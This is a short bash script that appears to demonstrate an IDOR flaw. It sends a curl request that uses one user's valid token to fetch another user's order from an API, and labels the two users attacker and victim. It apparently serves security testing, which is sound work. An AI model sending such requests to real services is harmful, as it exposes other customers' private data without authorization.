#!/bin/bash

echo "=== Fetching victim's order with attacker's own legitimate token ==="
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN_B" \
  --data-raw "{\"action\":\"get\",\"order-id\":\"$ORDER_C\"}" | jq
